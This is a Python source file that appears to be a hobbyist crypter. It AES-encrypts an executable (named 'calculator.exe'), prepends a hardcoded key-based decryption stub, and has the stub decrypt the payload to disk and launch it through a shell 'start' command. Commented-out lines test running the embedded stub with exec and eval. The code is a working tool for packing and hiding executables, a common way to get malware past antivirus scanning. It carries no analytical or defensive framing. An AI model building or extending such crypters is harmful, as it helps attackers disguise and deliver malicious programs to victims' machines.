import os
import sys
from Crypto.Cipher import AES
from Crypto import Random

# filename = os.path.join(os.path.dirname(os.path.abspath(__file__)), "calculator.exe")
filename = sys.argv[1]
key = b'\xa5\x9b\x12:\x0ce\xc8\x01\x99\x1cP\x98\xf2\x10)\x84\x9cz\xef\xba\x92\xbc\x8e\xd3\x9c,$\xd4\xa7/DH'
# STUB = '''
# import subprocess
# import os

# # decryptor_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "decrypter.py")
# # p = subprocess.Popen(["python", decryptor_path], shell=True, cwd=os.path.dirname(os.path.abspath(__file__)))
# # out, err = p.communicate()
# # # print(err)
# # # print(out)


# decrypted_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "(decrypted)calculator.exe")
# if os.path.exists(decrypted_file_path):
#     print("File exists")
#     subprocess.run(["start", "", decrypted_file_path], shell=True) #opens new cmd and runs file
#     # subprocess.run(decrypted_file_path, shell=True) #doesnt open shell, runs in background or already open shell
# else:
#     print("File does not exist")
# '''

STUB = '''
import os
import sys
from Crypto.Cipher import AES

# filename = "(enc)calculator.exe"
filename = sys.argv[1]
key = b'\xa5\x9b\x12:\x0ce\xc8\x01\x99\x1cP\x98\xf2\x10)\x84\x9cz\xef\xba\x92\xbc\x8e\xd3\x9c,$\xd4\xa7/DH'

def decrypt(key, filename):
	chunksize = AES.block_size*1024
	outputFile = os.path.join(os.path.dirname(os.path.abspath(__file__)), "(decrypted)calculator.exe")

	with open(filename, 'rb') as infile:
		filesize = int(infile.read(16))
		IV = infile.read(16)
		stub = infile.read(816)

		decryptor = AES.new(key, AES.MODE_CBC, IV)

		with open(outputFile, 'wb') as outfile:
			while True:
				chunk = infile.read(chunksize)

				if len(chunk) == 0:
					break

				outfile.write(decryptor.decrypt(chunk))

			outfile.truncate(filesize)

decrypt(key, filename)

import subprocess
import os

decrypted_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "(decrypted)calculator.exe")
subprocess.run(["start", "", decrypted_file_path], shell=True) #opens new cmd and runs file
'''

# Pad the STUB string with whitespace until its length is a multiple of 16
# // is integer division, to make sure we get an integer result
# then with this integer we add 1 to it (because we want to round up)
# then we multiply it by 16 to get the length of the string equal to a multiple of 16
STUB = STUB.ljust((len(STUB) // 16 + 1) * 16)
filesizeSTUB = len(STUB)
print(filesizeSTUB)

def encrypt(key, filename):
	chunksize = AES.block_size*1024
	# outputFile = "(enc)"+filename
	outputFile = os.path.join(os.path.dirname(os.path.abspath(__file__)), "(enc)"+os.path.basename(filename))
	filesize = str(os.path.getsize(filename)).zfill(16)
	IV = Random.new().read(16)

	encryptor = AES.new(key, AES.MODE_CBC, IV)

	with open(filename, 'rb') as infile:#rb means read in binary
		with open(outputFile, 'wb') as outfile:#wb means write in the binary mode
			outfile.write(filesize.encode('utf-8'))
			outfile.write(IV)
			outfile.write(STUB.encode('utf-8'))

			while True:
				chunk = infile.read(chunksize)

				if len(chunk) == 0:
					break
				elif len(chunk)%16 != 0:
					chunk += b' '*(16-(len(chunk)%16))

				outfile.write(encryptor.encrypt(chunk))




# with open(outputFile, 'a') as outfile:
# 	outfile.write(STUB)
# with open("COMBINER/(enc)calculator.exe", 'rb') as f:
# 		print("start")
# 		print(f.read(16))
# 		print(f.read(16))
		# print(f.read(filesizeSTUB))
		# print(filesizeSTUB)
		# command = f.read(filesizeSTUB).decode('utf-8') # decode from bytes to string (utf-8)
		# eval(command)
		# exec(command)
